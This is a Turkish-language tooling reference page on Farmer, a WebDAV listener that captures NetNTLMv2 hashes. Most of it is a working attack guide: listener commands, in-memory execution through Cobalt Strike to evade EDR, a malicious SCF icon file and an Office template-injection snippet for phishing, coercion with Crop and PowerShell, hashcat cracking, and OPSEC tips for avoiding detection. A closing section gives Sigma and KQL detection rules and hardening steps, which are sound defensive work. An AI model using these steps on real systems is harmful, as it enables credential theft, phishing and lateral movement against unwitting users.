# Farmer

> **Kategori:** [4. ZEHİRLEME, ORTADAKİ ADAM VE ZORLAMALI KİMLİK DOĞRULAMA (POISONING & COERCION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** WebDAV (Web Distributed Authoring and Versioning) protokolü üzerinden NetNTLMv2 hash'lerini toplamak amacıyla hafif (lightweight) bir yerel HTTP dinleyicisi açan C# .NET aracı.

---

## 1. Genel Bakış ve Amaç

**Farmer** (MDSec araştırmacısı Dominic Chell / Adam Chester tarafından geliştirilen), Windows işletim sistemlerinde SMB (TCP 445) portunun güvenlik duvarları tarafından engellendiği veya kısıtlandığı senaryolarda WebDAV protokolünü kullanarak NetNTLM kimlik doğrulama hash'lerini ele geçiren özel bir saldırı aracıdır.

Windows, bir UNC yoluna erişirken (örneğin `\\attacker\share`) ilk olarak SMB protokolünü (TCP 445 ve TCP 139) dener. Eğer SMB bağlantısı zaman aşımına uğrar veya güvenlik duvarı tarafından engellenirse, Windows'un **WebClient (DAV Mini-Redirector)** servisi devreye girerek bu yolu HTTP/WebDAV formatında çözmeye çalışır (`\\attacker@80\share` veya `\\attacker@SSL@443\share`). 

Farmer, bu WebDAV sorgularını karşılamak üzere hafif bir HTTP sunucusu açar. Kurban sistem WebDAV üzerinden bağlantı kurduğunda Farmer bir `HTTP 401 Unauthorized` başlığı ile NTLM Challenge döner. İstemci kendi kimlik doğrulama yanıtını (Type 3 NTLM Response) ilettiğinde kurbanın **NetNTLMv2** hash'i ele geçirilir.

```
       [ Kurban Windows İstemci ]
                   |
     1. UNC Erişimi: \\192.168.1.50@8080\test
                   |
     2. WebClient Servisi HTTP GET / OPTIONS Gönderir
                   v
     ============================================== Ağ (HTTP Trafiği)
                   |
                   v
          [ Farmer (C# .NET) ]
          [ Dinleyici: TCP 8080 ]
                   |
     3. HTTP 401 Unauthorized (WWW-Authenticate: NTLM Challenge)
                   |
                   v
     4. Kurban NTLM Response Gönderir (Type 3)
                   |
                   v
          [ NetNTLMv2 Hash Yakalandı ve Kaydedildi! ]
```

### Neden Önemli?
- **SMB Güvenlik Duvarı Engellerini Aşma:** Birçok kurumsal ağda ve bulut ortamında istemciler arasında SMB (445) trafiği tamamen yasaklanmıştır. WebDAV standart HTTP/HTTPS portlarını (80, 443, 8080 vb.) kullandığı için tüm ağ güvenlik duvarlarını ve EDR SMB izleme mekanizmalarını zahmetsizce atlatır.
- **Cobalt Strike / C2 Entegrasyonu:** Küçük boyutu ve saf .NET yapısı sayesinde C2 oturumlarında `execute-assembly` ile diske yazılmadan bellekten doğrudan çalıştırılabilir.
- **Zorlamalı İsteklerle Uyum:** `Crop`, dosya kısayolları (`.url`, `.lnk`, `.scf`) ve Office belgeleri içine gömülen WebDAV UNC yolları ile mükemmel bir ikili oluşturur.

### Alternatif Araçlarla Karşılaştırma

| Özellik / Kriter | Farmer | Responder | Inveigh |
|---|---|---|---|
| **Birincil Odak** | WebDAV (HTTP/HTTPS) | LLMNR, NBT-NS, SMB, HTTP | LLMNR, NBT-NS, mDNS, SMB |
| **Gereken Portlar** | Keyfi HTTP Portları (80, 8080, vb.) | Sabit Portlar (445, 137, 5355, 80) | Sabit Portlar (445, 80, 5355) |
| **SMB Firewall Engeli** | Etkilenmez (HTTP üzerinden akar) | SMB engellenirse çalışmaz | SMB engellenirse çalışmaz |
| **Çalışma Platformu** | Windows (C# .NET) | Linux (Python) | Windows (C# / PowerShell) |
| **Ağ Gürültüsü** | Çok Düşük (Yalnızca hedefli HTTP) | Yüksek (Broadcast/Multicast) | Yüksek (Broadcast/Multicast) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Farmer son derece yalın bir komut satırı arayüzüne sahiptir. Dinlenecek port ve opsiyonel log dosyası yolu argüman olarak iletilir.

```cmd
Farmer.exe <Port> [Çıktı_Dosyası] [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre / Argüman | Açıklama | Varsayılan | Örnek Kullanım |
|---|---|---|---|
| `<Port>` | Dinlenecek TCP port numarası (Zorunlu). | - | `8080`, `80`, `8888` |
| `[Çıktı_Dosyası]` | Yakalanan hash'lerin kaydedileceği dosya yolu. | Konsol | `hashes.txt`, `C:\Temp\dav.txt` |
| `[Zaman Aşımı]` | Belirli bir süre sonra sunucuyu sonlandırma (dakika). | Süresiz | `15` |
| `[SSL Desteği]` | HTTPS üzerinden WebDAV dinleme seçeneği. | HTTP | `@SSL@443` |

### WebDAV UNC Yol Formatları

Kurbanı Farmer'a yönlendirmek için aşağıdaki özel UNC sözdizimleri kullanılır:

- **Standart HTTP Port 80:** `\\attacker_ip\share\test`
- **Özel HTTP Portu (Örn: 8080):** `\\attacker_ip@8080\share\test`
- **Şifreli HTTPS Port 443:** `\\attacker_ip@SSL@443\share\test`
- **Standart SSL Portu:** `\\attacker_ip@SSL\share\test`

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Portta Dinleyici Başlatma ve Konsola Yazdırma

Yerel bir cmd oturumunda port 8080 üzerinde dinleyici başlatıp gelen bağlantıları anlık takip etme.

```cmd
Farmer.exe 8080
```

```text
[*] Farmer WebDAV Server started on port 8080
[*] Listening for incoming WebDAV authentication requests...
[+] WebDAV Request received from 192.168.1.115
[+] Method: OPTIONS | Path: /test
[+] Sending HTTP 401 Unauthorized (NTLM Auth Required)
[+] Method: PROPFIND | Path: /test
[+] NTLMv2 Hash Captured:
LAB\canan.erdogan::LAB:1122334455667788:B92C3D4E5F...:0101000000000000...
[*] Hash appended to memory cache.
```
*Analiz:* İstemcinin WebClient servisi `OPTIONS` ve `PROPFIND` metodlarıyla Farmer'a bağlandı; 401 yanıtının ardından kullanıcının NetNTLMv2 hash'i ekrana döküldü.

---

### Senaryo 2: Cobalt Strike Beacon ile Diske Yazmadan Çalıştırma

EDR kontrollerini atlatmak amacıyla C2 ajanının belleğinde (in-memory) Farmer başlatma.

```text
beacon> execute-assembly C:\Tools\Farmer.exe 8888 C:\Windows\Temp\debug.log
```

```text
[*] Tasked beacon to run assembly: Farmer.exe 8888 C:\Windows\Temp\debug.log
[+] host called home, sent: 48128 bytes
[+] Farmer WebDAV listener initialized on port 8888.
[+] Captured NTLMv2 for user: LAB\servis_hesabi
```
*Analiz:* Beacon işlemi içerisinden yeni bir iş parçacığı (thread) açılarak Farmer çalıştırıldı; yakalanan hash doğrudan C2 çıktısına iletildi.

---

### Senaryo 3: LNK / SCF Dosyası ile WebDAV Tetikleme

Bir ağ paylaşımına veya USB belleğe bırakılan zararlı kısayol dosyası ile istemcinin Farmer'a bağlanmasını sağlama.

```ini
[Shell]
Command=2
IconFile=\\192.168.1.50@8080\share\folder.ico
[Taskbar]
Command=ToggleDesktop
```
*Analiz:* Kurban klasörü Windows Gezgini'nde açtığı anda dosya ikonunu yüklemek için WebClient devreye girer, `192.168.1.50:8080` adresindeki Farmer'a bağlanarak hash bırakır.

---

### Senaryo 4: Crop Aracı ile WebDAV Tetikleme Entegrasyonu

MDSec'in `Crop` aracı ile hedef sistemde WebClient servisinin Farmer'a bağlanmasını zorlama.

```cmd
# 1. Saldırgan Makinede: Farmer'ı başlat
Farmer.exe 8080 hashes.txt

# 2. Kurban / Pivot Makinede: Crop ile Farmer'a istek tetikle
Crop.exe \\192.168.1.50@8080\share
```

```text
[*] Crop sending shell request to WebDAV UNC: \\192.168.1.50@8080\share
[+] WebClient service triggered successfully.
```
```text
[Farmer Çıktısı]
[+] WebDAV Client Connected: 192.168.1.120
[+] Captured NetNTLMv2: LAB\admin_mert::LAB:7A8B9C...
```
*Analiz:* Crop aracı yerel Windows API çağrıları ile WebClient'ı tetikleyerek `192.168.1.50@8080` adresine zorunlu kimlik doğrulama bağlantısı açtırdı.

---

### Senaryo 5: Word / Excel Belgesi İçine WebDAV UNC Enjeksiyonu

Phishing veya yetkisiz dosya paylaşımı senaryolarında bir Word belgesinin şablon (template) bağlantısına WebDAV UNC yolu ekleme.

```xml
<!-- settings.xml.rels içinde hedef bağlantı -->
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\192.168.1.50@8080\template.dotm" TargetMode="External"/>
```
*Analiz:* Kullanıcı Word belgesini açtığı anda Office arka planda WebClient üzerinden şablonu indirmeye çalışır ve kullanıcının oturum açma hash'i Farmer tarafından ele geçirilir.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Belirtisi / Log | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `HttpListenerException: Access is denied` | Belirtilen port (örn: 80) standart kullanıcı haklarıyla dinlenememekte veya URL ACL rezervasyonu bulunmamaktadır. | Yönetici haklarına geçin veya 1024 üzerindeki yüksek bir port seçin (`Farmer.exe 8080` veya `Farmer.exe 8888`). |
| `Kurban bağlandı ancak hash düşmedi (Anonim istek)` | Kurban istemcinin WebClient servisi NTLM kimlik doğrulamasını otomatik göndermiyor. | Hedefin Güvenilen Siteler (Trusted Sites) listesine IP'nizi ekletecek bir mekanizma kullanın veya NTLM zorlamasını tetikleyin. |
| `WebClient servisi çalışmıyor / Yanıt gelmiyor` | Windows Server sürümlerinde WebClient servisi varsayılan olarak yüklü değildir veya kapalıdır. | WebClient yalnızca Windows masaüstü (Windows 10/11) sürümlerinde varsayılan olarak hazırdır. Sunucularda önce WebClient tetikleyici araçlar kullanılmalı veya SMB/RPC koersiyonuna dönülmelidir. |
| `System.Net.Sockets.SocketException: Only one usage of each socket address is normally permitted` | Port başka bir süreç (IIS, Skype, yerel web servisi) tarafından işgal edilmiştir. | `netstat -ano \| findstr <Port>` ile çakışan PID'yi bulun veya farklı bir port ile Farmer'ı başlatın. |
| `Güvenlik Duvarı kurbanın bağlantısını engelledi` | Saldırgan makinesinde gelen port (örneğin 8080) host firewall'a takılmaktadır. | Güvenlik duvarında gelen kuralı açın: `netsh advfirewall firewall add rule name="Farmer" dir=in action=allow protocol=TCP localport=8080`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Event ID & Telemetri)

- **Windows Event ID 4624 (Logon):**
  - Logon Type: `3` (Network Logon).
  - Authentication Package: `NTLM`.
  - Hedef sunucu adı veya saldırgan makine bilgisi.
- **WebClient Operasyonel Günlükleri (Microsoft-Windows-WebClient/Operational):**
  - Event ID `900` / `901`: WebClient servisinin uzak bir URL'ye bağlanma girişimi.
- **Sysmon Event ID 3 (Network Connection):**
  - `rundll32.exe` veya `svchost.exe` (WebClient hizmetini barındıran) sürecinin dış/yerel IP adreslerine 8080/80 portundan HTTP bağlantısı yapması.

### 5.2 Ağ ve EDR İmzaları
- **User-Agent İmzası:** WebClient istekleri kendine has bir User-Agent başlığı gönderir: `Microsoft-WebDAV-MiniRedir/10.0.19041`. EDR ve NDR sistemleri anormal IP'lere giden bu başlığı izleyerek tespiti tetikler.
- **WebDAV Metotları:** Ağ trafiğinde standart web gezintisi haricinde `OPTIONS`, `PROPFIND` ve `LOCK` isteklerinin yoğunlaşması.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1187** | Forced Authentication | WebDAV UNC yolları ile kurbanı kimlik doğrulamaya zorlama. |
| **T1040** | Network Sniffing | HTTP NTLM challenge-response trafiğini yakalama. |
| **T1557** | Adversary-in-the-Middle | WebClient kimlik trafiğini araya girerek toplama. |
| **T1204.002** | User Execution: Malicious File | LNK/SCF veya Office dosyaları ile WebDAV tetikleme. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Adımı |
|---|---|
| **Ağ Tespiti:** Standart dışı portlar (örn: 8080, 9999) SOC alarmlarını tetikleyebilir. | İmkan varsa standart HTTP (80) veya SSL (443) portlarını tercih edin. |
| **Diske Log Yazma:** Diskte oluşan `.txt` dosyaları AV tarafından yakalanabilir. | Çıktıyı diske yazmayın; C2 hafızasından doğrudan okuyun. |
| **Servis Tetikleme:** Sunucularda WebClient başlatmak gürültü yaratabilir. | Yalnızca istemci (Windows 10/11) makineleri hedefleyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (Sigma — WebClient Dış Bağlantı Tespiti)
```yaml
title: Suspicious WebClient External Connection
status: experimental
description: WebClient servisinin anormal bir port üzerinden dış veya iç IP'ye WebDAV bağlantısı kurması.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        InitiatingProcessCommandLine|contains: 'svchost.exe -k LocalService -p -s WebClient'
        DestinationPort:
            - 80
            - 8080
            - 8888
    condition: selection
level: medium
```

#### Tespit Kuralı (KQL — Microsoft Defender for Endpoint)
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "svchost.exe"
| where ActionType == "ConnectionSuccess"
| where RemotePort in (8080, 8888, 8000)
| where AdditionalFields has "Microsoft-WebDAV-MiniRedir"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort
```

#### Sertleştirme Adımları
1. **WebClient Servisini Kapatma:** GPO üzerinden veya PowerShell ile tüm uç noktalarda WebClient servisi devre dışı bırakılmalıdır:
   ```powershell
   Stop-Service WebClient -PassThru; Set-Service WebClient -StartupType Disabled
   ```
2. **Güvenlik Duvarı Kısıtlamaları:** İstemcilerin dış ağlardaki veya diğer iç istemcilerdeki rastgele HTTP portlarına erişimi engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Standart port 8080 üzerinde dinleyici başlatma
Farmer.exe 8080
```
- **Ne Yapar?:** 8080 portunda WebDAV dinleyicisi açar ve yakalanan hash'leri konsola yazar.
- **Ne Zaman Kullanılır?:** Yerel veya pivot Windows makinesinde hızlı hash avı için.
- **Parametreler:** `8080`: Dinlenecek TCP portu.

```cmd
# 2. Hash'leri belirli bir metin dosyasına kaydetme
Farmer.exe 8080 C:\Temp\hashes.txt
```
- **Ne Yapar?:** Gelen NetNTLMv2 hash'lerini belirtilen metin dosyasına ekler (append).
- **Ne Zaman Kullanılır?:** Uzun süreli dinleme operasyonlarında çıktıyı saklamak için.
- **Parametreler:** `8080`: Port; `C:\Temp\hashes.txt`: Log dosyası konumu.

```text
# 3. Cobalt Strike Beacon üzerinden bellekten çalıştırma
beacon> execute-assembly C:\Tools\Farmer.exe 8888
```
- **Ne Yapar?:** Farmer'ı diske dosya yazmadan doğrudan Beacon sürecinin RAM'inde çalıştırır.
- **Ne Zaman Kullanılır?:** C2 tabanlı sızma testlerinde EDR atlatma amacıyla.
- **Parametreler:** `execute-assembly`: .NET hafıza yürütücüsü; `8888`: Port.

```cmd
# 4. Kurbanı test etmek için yerel Explorer WebDAV çağrısı
dir \\192.168.1.50@8080\share
```
- **Ne Yapar?:** Windows Gezgini'ni `192.168.1.50:8080` adresindeki Farmer'a bağlanmaya zorlar.
- **Ne Zaman Kullanılır?:** Dinleyicinin çalışıp çalışmadığını test etmek ve manuel tetiklemek için.
- **Parametreler:** `@8080`: WebDAV port belirteci.

```cmd
# 5. Standart HTTP port 80 üzerinde ayrıcalıklı dinleme
Farmer.exe 80
```
- **Ne Yapar?:** Doğrudan varsayılan HTTP portunda dinleyerek port belirtilmemiş standart UNC yollarını yakalar.
- **Ne Zaman Kullanılır?:** Yerel yönetici yetkisi olduğunda ve port 80 boşta olduğunda.
- **Parametreler:** `80`: Varsayılan HTTP portu.

```cmd
# 6. Crop aracı ile Farmer'ı eşzamanlı çalıştırma zinciri
Crop.exe \\192.168.1.50@8080\share
```
- **Ne Yapar?:** Windows WebClient servisine API seviyesinde UNC isteği yaptırarak Farmer'a kimlik iletir.
- **Ne Zaman Kullanılır?:** SMB port 445 kapalıyken yerel yetki yükseltme veya yanal hareket amacıyla.
- **Parametreler:** WebDAV UNC yolu.

```cmd
# 7. Yakalanan hash'leri Hashcat formatında ayıklama
findstr "::" C:\Temp\hashes.txt
```
- **Ne Yapar?:** Log dosyasındaki NetNTLMv2 hash satırlarını filtreler.
- **Ne Zaman Kullanılır?:** Kırma işlemine geçmeden önce temiz hash listesi oluşturmak için.
- **Parametreler:** `findstr`: Windows metin arama aracı.

```bash
# 8. Hashcat ile yakalanan WebDAV NetNTLMv2 hash'lerini kırma
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O
```
- **Ne Yapar?:** Farmer'ın yakaladığı NetNTLMv2 hash'lerini GPU yardımıyla kırar.
- **Ne Zaman Kullanılır?:** Parola ele geçirme aşamasında.
- **Parametreler:** `-m 5600`: NetNTLMv2 hash modu; `-O`: Optimize çekirdekler.

```powershell
# 9. PowerShell üzerinden WebClient tetikleyerek Farmer'a bağlanma
[System.IO.File]::ReadAllBytes("\\192.168.1.50@8080\share\test.txt")
```
- **Ne Yapar?:** .NET File API'si üzerinden WebDAV UNC yolunu çağırarak arka planda NTLM kimlik doğrulamasını tetikler.
- **Ne Zaman Kullanılır?:** Komut satırından sessizce WebClient servisini zorlamak istendiğinde.
- **Parametreler:** WebDAV UNC yolu parametresi.

```cmd
# 10. Şifreli HTTPS WebDAV dinleyicisi için SSL portu ile bağlantı
dir \\192.168.1.50@SSL@443\share
```
- **Ne Yapar?:** Trafiği SSL/TLS katmanında şifreleyerek IDS/IPS incelemelerini atlatır.
- **Ne Zaman Kullanılır?:** Ağda derin paket incelemesi (DPI) yapan güvenlik cihazları bulunduğunda.
- **Parametreler:** `@SSL@443`: HTTPS üzerinden WebDAV formatı.

---

## Kaynaklar

- **Resmi GitHub Deposu (Farmer):** [https://github.com/mdsecactivebreach/Farmer](https://github.com/mdsecactivebreach/Farmer)
- **MDSec Blog — Bypassing Network Restrictions with WebDAV:** [https://www.mdsec.co.uk/](https://www.mdsec.co.uk/)
- **Microsoft WebClient Servisi Mimarisi:** [https://learn.microsoft.com/en-us/windows/win32/fileio/webdav](https://learn.microsoft.com/en-us/windows/win32/fileio/webdav)

---

> **Önceki:** [← mitm6](./mitm6.md) · **Sonraki:** [Crop →](./Crop.md)

